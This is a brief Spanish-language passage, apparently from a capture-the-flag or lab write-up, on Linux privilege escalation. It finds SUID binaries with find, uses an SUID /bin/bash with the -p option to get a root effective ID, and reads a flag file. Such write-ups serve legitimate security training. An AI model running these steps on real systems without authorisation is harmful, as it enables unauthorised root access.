Para la escalada de privilegios vamos a buscar ejecutables con permisos *SUID*.
```
-bash-5.0$ find / -perm /4000 -ls 2>/dev/null
```
De todos los ficheros con permisos *SUID* nos llama la atención el ejecutable */bin/bash*.
Vamos a ejecutarlo con la opcion -p, que nos abrirar una shell bash guardando los permisos de *SUID*

```
-bash-5.0$ /usr/bin/bash -p
bash-5.0# id
uid=1000(oscp) gid=1000(oscp) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd),1000(oscp)
```

Hemos conseguido acceso *root* a la máquina y ya podemos leer el flag.

```
bash-5.0# cat flag.txt | cut -c1-15
```
